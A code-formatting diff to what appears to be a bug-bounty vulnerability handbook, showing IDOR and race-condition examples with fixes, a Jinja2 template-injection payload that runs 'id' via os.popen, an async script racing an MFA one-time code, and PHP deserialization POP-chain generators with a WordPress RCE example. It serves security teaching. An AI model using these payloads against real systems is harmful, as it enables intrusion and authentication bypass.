@@ -15,16 +15,16 @@ Root cause, pattern, bypass table, chaining opportunity, real paid examples.
 ### Root Cause
 ```python
 # VULNERABLE — no ownership check
-@app.route('/api/orders/<order_id>')
+@app.route("/api/orders/<order_id>")
 def get_order(order_id):
     order = db.query("SELECT * FROM orders WHERE id = ?", order_id)
     return jsonify(order)  # Never checks if order belongs to current user!
 
+
 # SECURE
-@app.route('/api/orders/<order_id>')
+@app.route("/api/orders/<order_id>")
 def get_order(order_id):
-    order = db.query("SELECT * FROM orders WHERE id = ? AND user_id = ?",
-                     order_id, current_user.id)
+    order = db.query("SELECT * FROM orders WHERE id = ? AND user_id = ?", order_id, current_user.id)
 ```
 
 ### Variants
@@ -214,14 +214,15 @@ Thread 2: deducts → -10 remaining (DOUBLE SPEND)
 ```python
 # VULNERABLE
 def spend_credit(user_id, amount):
-    balance = get_balance(user_id)    # CHECK
+    balance = get_balance(user_id)  # CHECK
     if balance >= amount:
-        deduct(user_id, amount)       # USE — gap here
+        deduct(user_id, amount)  # USE — gap here
+
 
 # SECURE (atomic)
-rows = db.execute("UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?",
-                  amount, user_id, amount)
-if rows == 0: raise InsufficientBalance()
+rows = db.execute("UPDATE balances SET amount=amount-? WHERE user_id=? AND amount>=?", amount, user_id, amount)
+if rows == 0:
+    raise InsufficientBalance()
 ```
 
 ### Testing
@@ -509,7 +510,7 @@ ${7*7}           → 49 = Freemarker / Velocity
 
 **Jinja2 (Python/Flask):**
 ```python
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__["os"].popen("id").read()}}
 ```
 
 **Twig (PHP/Symfony):**
@@ -701,10 +702,11 @@ curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
 ```python
 import asyncio, aiohttp
 
+
 async def verify(session, otp):
-    async with session.post("https://target.com/api/mfa/verify",
-                            json={"otp": otp}) as r:
+    async with session.post("https://target.com/api/mfa/verify", json={"otp": otp}) as r:
         return r.status, await r.text()
+
 
 async def race():
     cookies = {"session": "YOUR_SESSION"}
@@ -712,6 +714,8 @@ async def race():
         # Send same OTP simultaneously from two browsers
         results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
         print(results)
+
+
 asyncio.run(race())
 ```
 
@@ -942,39 +946,37 @@ class POPChainGenerator:
 
     def add_class(self, class_name, properties):
         """Add a class with controlled properties"""
-        self.chain.append({'class': class_name, 'properties': properties})
+        self.chain.append({"class": class_name, "properties": properties})
 
     def serialize(self):
         """Generate PHP serialized payload"""
         payload = ""
         for item in self.chain:
-            cls = item['class']
-            props = item['properties']
+            cls = item["class"]
+            props = item["properties"]
             payload += f'O:{len(cls)}:"{cls}":{len(props)}:'
-            payload += '{'
+            payload += "{"
             for prop_name, prop_value in props.items():
                 # Handle private properties (\0ClassName\0propertyName)
-                if prop_name.startswith('_'):
+                if prop_name.startswith("_"):
                     prop_name = f"\0{cls}\0{prop_name.lstrip('_')}"
                 payload += f's:{len(prop_name)}:"{prop_name}";'
                 payload += self._serialize_value(prop_value)
-            payload += '}'
+            payload += "}"
         return payload
 
     def _serialize_value(self, value):
         if isinstance(value, str):
             return f's:{len(value)}:"{value}";'
         elif isinstance(value, int):
-            return f'i:{value};'
+            return f"i:{value};"
         # Add more types as needed
         return value
 
+
 # Example: WordPress RCE chain
 chain = POPChainGenerator()
-chain.add_class('WP_User_Meta_Session_Tokens', {
-    '_session': ['RCE_PAYLOAD'],
-    '_user_id': 1
-})
+chain.add_class("WP_User_Meta_Session_Tokens", {"_session": ["RCE_PAYLOAD"], "_user_id": 1})
 print(chain.serialize())
 ```
 
@@ -1121,13 +1123,13 @@ class POPExploitGenerator:
         # Use PHPGGC or manual serialization
         pass
 
-    def generate_exploit_code(self, language='python'):
+    def generate_exploit_code(self, language="python"):
         """Generate full exploit in specified language"""
-        if language == 'python':
+        if language == "python":
             return self._python_exploit()
-        elif language == 'php':
+        elif language == "php":
             return self._php_exploit()
-        elif language == 'bash':
+        elif language == "bash":
             return self._bash_exploit()
 
     def _python_exploit(self):
@@ -1149,7 +1151,7 @@ print(f"Response: {{response.text}}")
 
     def save_exploit(self, output_path):
         """Save exploit to file"""
-        with open(output_path, 'w') as f:
+        with open(output_path, "w") as f:
             f.write(self.generate_exploit_code())
 ```
 
